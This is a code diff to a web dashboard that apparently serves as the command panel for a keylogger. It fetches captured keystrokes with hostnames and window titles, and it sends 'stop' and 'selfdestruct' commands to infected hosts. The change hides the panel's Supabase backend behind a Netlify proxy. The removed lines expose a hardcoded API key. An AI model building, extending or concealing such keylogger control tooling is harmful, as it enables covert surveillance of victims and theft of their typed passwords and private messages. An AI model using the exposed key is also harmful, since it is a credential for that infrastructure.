@@ -63,14 +63,7 @@ tr:hover td { background: #1a1a25; }
 <div class="toast" id="toast"></div>
 
 <script>
-const SUPABASE_URL = 'https://xdxlfkyywnjrzqblvdzg.supabase.co';
-const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhkeGxma3l5d25qcnpxYmx2ZHpnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MTcwOTgsImV4cCI6MjA5NTM5MzA5OH0.ouEQ_0iNr7xT7FpaySMvNlGTg37z_rVKPD7CqKiALpo';
-
-const headers = {
-    'apikey': SUPABASE_ANON_KEY,
-    'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
-    'Content-Type': 'application/json'
-};
+const PROXY_URL = '/.netlify/functions/proxy';
 
 let refreshInterval = null;
 let countdown = 0;
@@ -95,7 +88,7 @@ function showToast(msg, type) {
 
 async function fetchKeys() {
     try {
-        const res = await fetch(SUPABASE_URL + '/rest/v1/keystrokes?select=created_at,hostname,window_title,keys&order=created_at.desc&limit=100', { headers });
+        const res = await fetch(PROXY_URL + '?path=/rest/v1/keystrokes&select=created_at,hostname,window_title,keys&order=created_at.desc&limit=100', { headers: {} });
         if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
         const data = await res.json();
 
@@ -134,9 +127,9 @@ async function sendStop() {
     btn.textContent = 'Sending...';
 
     try {
-        const res = await fetch(SUPABASE_URL + '/rest/v1/control', {
+        const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
             method: 'POST',
-            headers: headers,
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ command: 'stop', hostname: hostname, executed: false })
         });
         if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
@@ -159,9 +152,9 @@ async function sendDestruct() {
     btn.textContent = 'Sending...';
 
     try {
-        const res = await fetch(SUPABASE_URL + '/rest/v1/control', {
+        const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
             method: 'POST',
-            headers: headers,
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ command: 'selfdestruct', hostname: hostname, executed: false })
         });
         if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
